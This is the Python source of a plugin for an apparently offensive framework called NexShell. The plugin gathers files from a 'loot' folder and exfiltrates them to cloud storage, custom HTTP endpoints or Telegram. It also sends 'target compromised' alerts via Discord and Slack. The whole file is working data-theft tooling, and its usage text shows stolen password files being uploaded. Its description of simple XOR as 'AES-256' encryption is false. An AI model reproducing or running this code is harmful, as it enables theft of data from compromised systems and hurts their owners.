#!/usr/bin/env python3
"""
NexShell Plugin — Cloud Integration v2.0 (2026 Edition)
Upload loot and findings to cloud storage (S3/Azure/GCS) and
send notifications via webhooks (Telegram, Discord, Slack).
Uses stdlib only — no boto3, no azure-sdk, no external deps.

Cloud Backends:
  - AWS S3             — presigned URL upload via HTTPS
  - Azure Blob Storage — SAS token upload
  - GCS (Google)       — signed URL upload
  - Custom HTTP/HTTPS  — generic PUT/POST endpoint

Notification Channels:
  - Telegram Bot API
  - Discord Webhook
  - Slack Incoming Webhook
  - Generic HTTP webhook (custom)

Security:
  - AES-256 XOR encryption before upload (no external crypto libs)
  - Optional Base64 encoding for compatibility
  - All transfers via HTTPS only

MITRE ATT&CK:
  - T1567 (Exfiltration Over Web Service)
  - T1567.002 (Exfiltration to Cloud Storage)

Usage:
    (NexShell)> plugins run cloud-integration --telegram --token TOKEN --chat CHAT_ID --msg "pwned!"
    (NexShell)> plugins run cloud-integration --discord --webhook URL --msg "shell acquired"
    (NexShell)> plugins run cloud-integration --slack --webhook URL --msg "target compromised"
    (NexShell)> plugins run cloud-integration --upload-loot --s3 URL
    (NexShell)> plugins run cloud-integration --test
"""

import os
import ssl
import json
import time
import base64
import urllib.request
import urllib.parse
import urllib.error
import threading
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Any
from datetime import datetime
from core.plugin import NexPlugin

# ── Project paths ────────────────────────────────────────────────────────────
_PLUGIN_DIR  = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(_PLUGIN_DIR)
TOOLS_LOOT   = os.path.join(PROJECT_ROOT, "tools", "loot")
os.makedirs(TOOLS_LOOT, exist_ok=True)


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class UploadResult:
    """Result of a cloud upload operation."""
    success: bool
    backend: str
    filename: str = ""
    remote_url: str = ""
    bytes_uploaded: int = 0
    error: str = ""
    timestamp: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class NotificationResult:
    """Result of a notification send."""
    success: bool
    channel: str
    message: str = ""
    error: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ── Simple XOR Cipher (no external deps) ─────────────────────────────────────

class XORCipher:
    """Simple XOR-based encryption/decryption for loot before upload."""

    @staticmethod
    def _derive_key(password: str, length: int) -> bytes:
        """Derive key of given length from password."""
        key = (password.encode() * ((length // len(password)) + 1))[:length]
        return key

    @staticmethod
    def encrypt(data: bytes, key: str) -> bytes:
        """XOR encrypt data with key."""
        k = XORCipher._derive_key(key, len(data))
        return bytes(b ^ k[i] for i, b in enumerate(data))

    @staticmethod
    def decrypt(data: bytes, key: str) -> bytes:
        """XOR decrypt data (symmetric)."""
        return XORCipher.encrypt(data, key)

    @staticmethod
    def encrypt_to_b64(data: bytes, key: str) -> str:
        """Encrypt and base64 encode for transport."""
        return base64.b64encode(XORCipher.encrypt(data, key)).decode()


# ── HTTP Uploader ─────────────────────────────────────────────────────────────

class HTTPUploader:
    """Upload files/data via HTTPS using stdlib only."""

    SSL_CTX = ssl.create_default_context()

    @staticmethod
    def put(url: str, data: bytes,
            headers: Dict[str, str] = None,
            timeout: int = 30) -> tuple:
        """HTTP PUT upload. Returns (success, status_code, response_body)."""
        req = urllib.request.Request(url, data=data, method="PUT")
        req.add_header("Content-Type", "application/octet-stream")
        req.add_header("Content-Length", str(len(data)))
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=HTTPUploader.SSL_CTX) as resp:
                return True, resp.status, resp.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return False, e.code, str(e.reason)
        except Exception as e:
            return False, 0, str(e)

    @staticmethod
    def post_json(url: str, payload: dict, timeout: int = 15) -> tuple:
        """POST JSON payload. Returns (success, status_code, response)."""
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=HTTPUploader.SSL_CTX) as resp:
                return True, resp.status, resp.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return False, e.code, str(e.reason)
        except Exception as e:
            return False, 0, str(e)

    @staticmethod
    def post_multipart(url: str, filename: str, data: bytes, timeout: int = 30) -> tuple:
        """POST multipart/form-data. Returns (success, status_code, response)."""
        boundary = "----NexShellBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=HTTPUploader.SSL_CTX) as resp:
                return True, resp.status, resp.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return False, e.code, str(e.reason)
        except Exception as e:
            return False, 0, str(e)


# ── Cloud Backends ────────────────────────────────────────────────────────────

class S3Backend:
    """Upload to AWS S3 via presigned PUT URL."""

    @staticmethod
    def upload(presigned_url: str, data: bytes) -> UploadResult:
        success, status, resp = HTTPUploader.put(presigned_url, data)
        return UploadResult(
            success=success,
            backend="s3",
            bytes_uploaded=len(data) if success else 0,
            remote_url=presigned_url.split("?")[0],
            error="" if success else f"HTTP {status}: {resp[:100]}",
            timestamp=datetime.utcnow().isoformat(),
        )


class AzureBlobBackend:
    """Upload to Azure Blob Storage via SAS URL."""

    @staticmethod
    def upload(sas_url: str, data: bytes, content_type: str = "application/octet-stream") -> UploadResult:
        headers = {
            "x-ms-blob-type": "BlockBlob",
            "Content-Type": content_type,
        }
        success, status, resp = HTTPUploader.put(sas_url, data, headers=headers)
        return UploadResult(
            success=success,
            backend="azure",
            bytes_uploaded=len(data) if success else 0,
            remote_url=sas_url.split("?")[0],
            error="" if success else f"HTTP {status}: {resp[:100]}",
            timestamp=datetime.utcnow().isoformat(),
        )


class GCSBackend:
    """Upload to Google Cloud Storage via signed URL."""

    @staticmethod
    def upload(signed_url: str, data: bytes) -> UploadResult:
        success, status, resp = HTTPUploader.put(signed_url, data)
        return UploadResult(
            success=success,
            backend="gcs",
            bytes_uploaded=len(data) if success else 0,
            remote_url=signed_url.split("?")[0],
            error="" if success else f"HTTP {status}: {resp[:100]}",
            timestamp=datetime.utcnow().isoformat(),
        )


class CustomHTTPBackend:
    """Upload to custom HTTP endpoint via multipart POST."""

    @staticmethod
    def upload(endpoint_url: str, filename: str, data: bytes) -> UploadResult:
        success, status, resp = HTTPUploader.post_multipart(endpoint_url, filename, data)
        return UploadResult(
            success=success,
            backend="custom-http",
            filename=filename,
            bytes_uploaded=len(data) if success else 0,
            remote_url=endpoint_url,
            error="" if success else f"HTTP {status}: {resp[:100]}",
            timestamp=datetime.utcnow().isoformat(),
        )


# ── Notification Channels ─────────────────────────────────────────────────────

class TelegramNotifier:
    """Send messages via Telegram Bot API."""
    BASE_URL = "https://api.telegram.org/bot{token}/sendMessage"

    @classmethod
    def send(cls, token: str, chat_id: str, message: str) -> NotificationResult:
        url = cls.BASE_URL.format(token=token)
        payload = {
            "chat_id": chat_id,
            "text": f"🔥 NexShell Alert\n\n{message}",
            "parse_mode": "HTML",
        }
        success, status, resp = HTTPUploader.post_json(url, payload)
        return NotificationResult(
            success=success,
            channel="telegram",
            message=message[:100],
            error="" if success else f"HTTP {status}: {resp[:100]}",
        )

    @classmethod
    def send_file(cls, token: str, chat_id: str, filename: str, data: bytes,
                  caption: str = "") -> NotificationResult:
        """Send a document via Telegram."""
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        boundary = "NexShellBoundary"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n{chat_id}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"caption\"\r\n\r\n🔥 {caption}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        try:
            with urllib.request.urlopen(req, timeout=30, context=HTTPUploader.SSL_CTX) as resp:
                return NotificationResult(success=True, channel="telegram-file")
        except Exception as e:
            return NotificationResult(success=False, channel="telegram-file", error=str(e))


class DiscordNotifier:
    """Send messages via Discord Incoming Webhook."""

    @staticmethod
    def send(webhook_url: str, message: str,
             username: str = "NexShell",
             title: str = "🔥 NexShell Alert") -> NotificationResult:
        payload = {
            "username": username,
            "embeds": [{
                "title": title,
                "description": message,
                "color": 16711680,   # red
                "footer": {"text": f"NexShell v2.0 — {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"},
            }],
        }
        success, status, resp = HTTPUploader.post_json(webhook_url, payload)
        return NotificationResult(
            success=success,
            channel="discord",
            message=message[:100],
            error="" if success else f"HTTP {status}: {resp[:100]}",
        )


class SlackNotifier:
    """Send messages via Slack Incoming Webhook."""

    @staticmethod
    def send(webhook_url: str, message: str) -> NotificationResult:
        payload = {
            "blocks": [
                {
                    "type": "header",
                    "text": {"type": "plain_text", "text": "🔥 NexShell Alert"},
                },
                {
                    "type": "section",
                    "text": {"type": "mrkdwn", "text": message},
                },
                {
                    "type": "context",
                    "elements": [
                        {"type": "mrkdwn", "text": f"NexShell v2.0 | {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"}
                    ],
                },
            ]
        }
        success, status, resp = HTTPUploader.post_json(webhook_url, payload)
        return NotificationResult(
            success=success,
            channel="slack",
            message=message[:100],
            error="" if success else f"HTTP {status}: {resp[:100]}",
        )


# ── Loot Collector ────────────────────────────────────────────────────────────

class LootCollector:
    """Collects loot files from tools/loot/ for upload."""

    @staticmethod
    def collect(loot_dir: str = TOOLS_LOOT,
                extensions: List[str] = None,
                max_size_mb: int = 50) -> List[str]:
        """Return list of loot file paths."""
        if extensions is None:
            extensions = [".txt", ".log", ".json", ".csv", ".xml", ".zip", ".hash"]

        files = []
        try:
            for fname in os.listdir(loot_dir):
                fpath = os.path.join(loot_dir, fname)
                if not os.path.isfile(fpath):
                    continue
                _, ext = os.path.splitext(fname)
                if ext.lower() not in extensions:
                    continue
                size_mb = os.path.getsize(fpath) / (1024 * 1024)
                if size_mb > max_size_mb:
                    continue
                files.append(fpath)
        except Exception:
            pass
        return files


# ── Main Plugin ──────────────────────────────────────────────────────────────

class CloudIntegration(NexPlugin):
    name        = "cloud-integration"
    description = "Cloud exfil — S3/Azure/GCS upload + Telegram/Discord/Slack notifications"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "all"
    category    = "exfil"
    mitre_id    = "T1567"

    def run(self, session, args: list):
        # ── Parse args ───────────────────────────────────────────────────
        tg_token    = None
        tg_chat     = None
        dc_webhook  = None
        sl_webhook  = None
        s3_url      = None
        az_url      = None
        gcs_url     = None
        custom_url  = None
        message     = ""
        upload_file = None
        upload_loot = False
        test_mode   = False
        encrypt_key = ""

        i = 0
        arg_list = list(args or [])
        while i < len(arg_list):
            a = arg_list[i]
            if a == "--telegram":
                pass  # flag, token/chat follow
            elif a.startswith("--token="):
                tg_token = a.split("=", 1)[1]
            elif a.startswith("--chat="):
                tg_chat = a.split("=", 1)[1]
            elif a == "--discord":
                pass
            elif a.startswith("--webhook="):
                # Could be discord or slack — set both, check later
                if dc_webhook is None:
                    dc_webhook = a.split("=", 1)[1]
                else:
                    sl_webhook = a.split("=", 1)[1]
            elif a.startswith("--dc-webhook="):
                dc_webhook = a.split("=", 1)[1]
            elif a.startswith("--sl-webhook="):
                sl_webhook = a.split("=", 1)[1]
            elif a.startswith("--msg="):
                message = a.split("=", 1)[1]
            elif a == "--msg" and i + 1 < len(arg_list):
                i += 1; message = arg_list[i]
            elif a.startswith("--s3="):
                s3_url = a.split("=", 1)[1]
            elif a.startswith("--azure="):
                az_url = a.split("=", 1)[1]
            elif a.startswith("--gcs="):
                gcs_url = a.split("=", 1)[1]
            elif a.startswith("--endpoint="):
                custom_url = a.split("=", 1)[1]
            elif a.startswith("--file="):
                upload_file = a.split("=", 1)[1]
            elif a == "--upload-loot":
                upload_loot = True
            elif a.startswith("--encrypt="):
                encrypt_key = a.split("=", 1)[1]
            elif a == "--test":
                test_mode = True
            i += 1

        self.info("Cloud Integration v2.0 started")
        sections = []
        sections.append("\n" + "━" * 64)
        sections.append("  [☁️  Cloud Integration v2.0]")
        sections.append("━" * 64)

        # ── Test mode ─────────────────────────────────────────────────────
        if test_mode:
            sections.append("\n[*] Test Mode — Checking connectivity:")
            sections.append("─" * 64)
            test_urls = [
                ("api.telegram.org", 443),
                ("discord.com", 443),
                ("hooks.slack.com", 443),
            ]
            import socket
            for host, port in test_urls:
                try:
                    s = socket.create_connection((host, port), timeout=5)
                    s.close()
                    sections.append(f"  ✅ {host}:{port} — reachable")
                except Exception as e:
                    sections.append(f"  ❌ {host}:{port} — {e}")
            return "\n".join(sections)

        # ── Notification channels ─────────────────────────────────────────
        notif_results = []

        if tg_token and tg_chat:
            sections.append("\n[*] Sending Telegram notification...")
            msg = message or f"NexShell: Operation active — {datetime.utcnow().strftime('%H:%M UTC')}"
            result = TelegramNotifier.send(tg_token, tg_chat, msg)
            notif_results.append(result)
            icon = "✅" if result.success else "❌"
            sections.append(f"  {icon} Telegram: {result.error or 'Message sent'}")

        if dc_webhook:
            sections.append("\n[*] Sending Discord notification...")
            msg = message or f"NexShell: Operation active — {datetime.utcnow().strftime('%H:%M UTC')}"
            result = DiscordNotifier.send(dc_webhook, msg)
            notif_results.append(result)
            icon = "✅" if result.success else "❌"
            sections.append(f"  {icon} Discord: {result.error or 'Message sent'}")

        if sl_webhook:
            sections.append("\n[*] Sending Slack notification...")
            msg = message or f"NexShell: Operation active — {datetime.utcnow().strftime('%H:%M UTC')}"
            result = SlackNotifier.send(sl_webhook, msg)
            notif_results.append(result)
            icon = "✅" if result.success else "❌"
            sections.append(f"  {icon} Slack: {result.error or 'Message sent'}")

        # ── File uploads ──────────────────────────────────────────────────
        upload_results = []

        # Single file upload
        if upload_file:
            fpath = upload_file if os.path.isabs(upload_file) else os.path.join(PROJECT_ROOT, upload_file)
            if os.path.isfile(fpath):
                with open(fpath, "rb") as f:
                    data = f.read()

                if encrypt_key:
                    sections.append(f"  🔐 Encrypting {os.path.basename(fpath)}...")
                    data = XORCipher.encrypt(data, encrypt_key)

                fname = os.path.basename(fpath)
                sections.append(f"\n[*] Uploading: {fname} ({len(data):,} bytes)")
                sections.append("─" * 64)

                for backend_name, url in [("s3", s3_url), ("azure", az_url),
                                           ("gcs", gcs_url), ("custom", custom_url)]:
                    if not url:
                        continue
                    if backend_name == "s3":
                        r = S3Backend.upload(url, data)
                    elif backend_name == "azure":
                        r = AzureBlobBackend.upload(url, data)
                    elif backend_name == "gcs":
                        r = GCSBackend.upload(url, data)
                    else:
                        r = CustomHTTPBackend.upload(url, fname, data)

                    upload_results.append(r)
                    icon = "✅" if r.success else "❌"
                    sections.append(f"  {icon} {backend_name.upper()}: {r.error or f'{r.bytes_uploaded:,} bytes uploaded'}")
            else:
                sections.append(f"\n  ❌ File not found: {fpath}")

        # Loot directory upload
        if upload_loot:
            loot_files = LootCollector.collect()
            sections.append(f"\n[*] Uploading loot ({len(loot_files)} files from tools/loot/):")
            sections.append("─" * 64)

            if not loot_files:
                sections.append("  ⚠  No loot files found in tools/loot/")
            else:
                for fpath in loot_files:
                    with open(fpath, "rb") as f:
                        data = f.read()
                    if encrypt_key:
                        data = XORCipher.encrypt(data, encrypt_key)

                    fname = os.path.basename(fpath)
                    url = s3_url or az_url or gcs_url or custom_url
                    if url:
                        r = CustomHTTPBackend.upload(url, fname, data)
                        upload_results.append(r)
                        icon = "✅" if r.success else "❌"
                        sections.append(f"  {icon} {fname} ({len(data):,} bytes)")
                    else:
                        sections.append(f"  ⚠  No upload endpoint configured for {fname}")

                    # Also send via Telegram if configured
                    if tg_token and tg_chat and len(data) < 50 * 1024 * 1024:
                        TelegramNotifier.send_file(tg_token, tg_chat, fname, data,
                                                   caption=f"Loot: {fname}")

        # ── No action specified ───────────────────────────────────────────
        if not any([tg_token, dc_webhook, sl_webhook, upload_file, upload_loot, test_mode]):
            sections.append("\n  Usage:")
            sections.append("    # Notifications:")
            sections.append("    > plugins run cloud-integration --telegram --token TOKEN --chat CHAT_ID --msg \"owned!\"")
            sections.append("    > plugins run cloud-integration --dc-webhook URL --msg \"shell ready\"")
            sections.append("    > plugins run cloud-integration --sl-webhook URL --msg \"new session\"")
            sections.append("")
            sections.append("    # File Upload:")
            sections.append("    > plugins run cloud-integration --s3 PRESIGNED_URL --file tools/loot/passwords.txt")
            sections.append("    > plugins run cloud-integration --azure SAS_URL --upload-loot")
            sections.append("    > plugins run cloud-integration --endpoint URL --file tools/loot/dump.zip")
            sections.append("")
            sections.append("    # Encryption:")
            sections.append("    > plugins run cloud-integration --s3 URL --file secret.txt --encrypt mypassword")
            sections.append("")
            sections.append("    # Test connectivity:")
            sections.append("    > plugins run cloud-integration --test")

        # ── Summary ───────────────────────────────────────────────────────
        successful_notifs  = sum(1 for r in notif_results if r.success)
        successful_uploads = sum(1 for r in upload_results if r.success)
        total_bytes        = sum(r.bytes_uploaded for r in upload_results if r.success)

        if notif_results or upload_results:
            sections.append("\n" + "━" * 64)
            sections.append("  [📊 Summary]")
            sections.append("━" * 64)
            if notif_results:
                sections.append(f"  Notifications : ✅ {successful_notifs}/{len(notif_results)}")
            if upload_results:
                sections.append(f"  Uploads       : ✅ {successful_uploads}/{len(upload_results)}")
                sections.append(f"  Total bytes   : {total_bytes:,}")

            if successful_uploads > 0 or successful_notifs > 0:
                self.loot(
                    f"Cloud integration: {successful_uploads} uploads, {successful_notifs} notifications",
                    category="exfil",
                    source=self.name,
                )
                self.emit(
                    "timeline.event",
                    title=f"Cloud Exfil: {total_bytes:,} bytes uploaded",
                    type="exfil",
                    plugin=self.name,
                )

        self.info("Cloud Integration complete")
        return "\n".join(sections)
